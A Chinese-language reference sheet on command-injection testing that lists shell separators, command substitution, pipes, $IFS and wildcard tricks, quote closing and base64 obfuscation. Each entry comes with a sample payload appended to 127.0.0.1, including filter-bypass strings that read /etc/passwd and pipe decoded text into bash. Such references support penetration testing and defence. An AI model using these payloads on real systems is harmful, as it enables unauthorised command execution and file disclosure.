命令注入的难点在于找到对应的注入点，以及我们要使用什么样的通配符去做验证。下面这边也给大家汇总了些常用的通配符，以及它们的用法示例，供大家日后使用作为参考。  
  
1. 命令分隔符  
  
这类符号用于在一个命令行中执行多条命令，是注入攻击中最核心的利用方式。  
  
;  
 (分号)：在类 Unix 系统（Linux/macOS）和 Windows 中都可以使用，无论前一条命令成功与否，都会顺序执行后一条命令。  
  
测试示例： 127.0.0.1  
; whoami  
  
&  
 (与符号)：在类 Unix 系统中用于将命令放入后台执行；在 Windows 中，它通常用于分隔命令，表示无论前一条命令是否成功，都会执行后一条。  
  
测试示例： 127.0.0.1   
& whoami  
  
&&  
 (逻辑与)：只有前一条命令执行成功（退出码为0），才会执行后一条命令。  
  
测试示例： 127.0.0.1   
&& whoami  
  
|| (逻辑或)：只有前一条命令执行失败，才会执行后一条命令。  
  
测试示例： 127.0.0.1   
||  
 whoami  
  
换行符：在某些环境下（如脚本注入），换行符（  
\n 或  
   
%0a）也可以作为命令的结束符和新命令的开始符。  
  
URL编码测试示例： 127.0.0.1  
%0awhoami  
  
2. 命令替换/子 shell  
  
这类符号用于执行一条命令，并用它的输出来替换本身的位置。  
  
反引号 `command`：执行其中的命令，并将其输出嵌入到原命令行中。  
  
测试示例： 127.0.0.1  
'whoami`  
  
$(command)：这是更现代且推荐使用的命令替换写法（支持嵌套），Bash 和 PowerShell 等均支持。  
  
测试示例： 127.0.0.1   
$(whoami)  
  
3. 管道符  
  
用于将一个命令的输出作为下一个命令的输入。  
  
| (管道)：将左侧命令的标准输出连接到右侧命令的标准输入。在注入中，常被用来处理输出或执行新命令。  
  
测试示例： 127.0.0.1   
| whoami  
  
4. 通配符与环境变量  
  
虽然不能直接执行新命令，但常被用于绕过简单的输入过滤（如黑名单）。  
  
通配符：  
*、  
? 等。如果后端试图执行通配符展开，可能会意外地匹配并执行某个文件。  
  
环境变量：  
$PATH、  
$IFS。  
$IFS（内部字段分隔符）常用于在  
禁空格的场景下  
代替空格。  
  
示例（绕过空格过滤）： 127.0.0.1  
${IFS}whoami  
  
5. 字符串拼接与编码  
  
用于混淆命令以绕过基于字符串匹配的检测。  
  
变量截取/拼接：在 Shell 中，/bin/cat /etc/passwd 可以写成   
/bin/c'at' /etc/passwd，或者利用变量   
a=who; b=ami; $a$b。  
  
Base64编码：echo whoami | base64 得到   
d2hvYW1pCg==，然后在目标上执行 `echo d2hvYW1pCg== | base64 -d | bash`。  
  
6. 特殊字符利用  
  
通配符（补充）：  
* 匹配任意字符串，  
? 匹配单个字符，[...] 匹配指定范围内的字符。例如，  
/???/c?t /etc/passwd 可以匹配   
/bin/cat /etc/passwd。  
  
重定向符：  
< 用于输入重定向，  
> 用于输出重定向。虽然不直接执行命令，但可用于文件操作。  
  
测试示例： 127.0.0.1   
> /tmp/test.txt（测试是否有文件写入权限）  
  
注释符：# 在 Unix/Linux 中表示注释，  
:: 或 REM 在 Windows 批处理中表示注释。可用于截断原始命令的后半部分。  
  
测试示例： 127.0.0.1   
# whoami（如果注入点在末尾，# 会让后面的原始命令逻辑失效）  
  
闭合字符：如果注入点是在引号  
（' 或   
"）或括号中，首先需要输入额外的引号或括号来闭合前面的上下文，然后再注入分隔符和新命令。  
  
测试示例： 127.0.0.1  
" || whoami #（假设原始命令是   
ping "用户输入"）,所以在原始指令中添加 " 进行闭合，然后再添加其他符号。
